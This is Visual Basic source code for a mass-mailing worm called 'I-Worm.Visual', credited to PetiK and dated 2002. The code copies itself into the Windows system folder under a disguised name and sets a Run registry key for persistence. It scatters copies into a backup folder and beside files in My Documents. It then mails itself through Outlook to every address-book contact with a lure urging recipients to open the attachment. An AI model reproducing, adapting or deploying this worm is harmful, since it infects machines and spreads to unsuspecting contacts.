   Attribute VB_Name = "Module1"
   'I-Worm.Visual coded by PetiK
   'Date : May 19th 2002
   'Language : Visual Basic

   Sub Main()
   On Error Resume Next
   Set fso = CreateObject("Scripting.FilesystemObject")
   Set ws = CreateObject("WScript.Shell")
   orig = App.Path & "\" & App.EXEName & ".exe"
   cop = fso.GetSpecialFolder(1) & "\kern32dll.exe"
   FileCopy orig, cop
   ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\kern32dll", cop
   fso.CreateFolder ("C:\Backup")

   ncopy = ""
   For I = 1 To 10
   Randomize (Timer)
   ncopy = ncopy + Chr(Int(Rnd() * 26) + 97)
   Next I
   FileCopy orig, "C:\Backup\" & ncopy & ".exe"

   Call inf(ws.SpecialFolders("MyDocuments"))

   Set out = CreateObject("Outlook.Application")
   Set map = out.GetNameSpace("MAPI")
   If out = "Outlook" Then
   map.Logon "profile", "password"
   For y = 1 To map.AddressLists.Count
   Set z = map.AddressLists(y)
   x = 1
   Set mel = out.CreateItem(0)
   For oo = 1 To z.AddressEntries.Count
   e = z.AddressEntries(x)
   ml.Recipients.Add e
   x = x + 1
   If x < 250 Then oo = z.AddressEntries.Count
   Next oo
   mel.Subject = "New Visual Tool for U"
   mel.Body = "Look at this new tool by clicking on attached file."
   mel.Attachments.Add orig, 1, 1, "visual_tool.exe"
   mel.Send
   e = ""
   Next y
   map.Logoff
   End If

   If Day(Now) = 19 Then about.Visible = True
   End Sub

   Sub inf(folder)
   Set fso = CreateObject("Scripting.FilesystemObject")
   Set ws = CreateObject("WScript.Shell")
   orig = App.Path & "\" & App.EXEName & ".exe"
   Set dire = fso.GetFolder(folder)
   Set fc = dire.Files

   For Each f1 In fc
   ext = fso.GetExtensionName(f1.Path)
   ext = LCase(ext)
   oext = LCase(f1.Name)
   If (ext <> "vbs") Then
   If (Right(oext, 8) <> "old_.exe") Then
   'MsgBox oext, vbInformation, Right(oext, 8)
   FileCopy orig, f1.Path & "old_.exe"
   End If
   End If
   Next

   End Sub
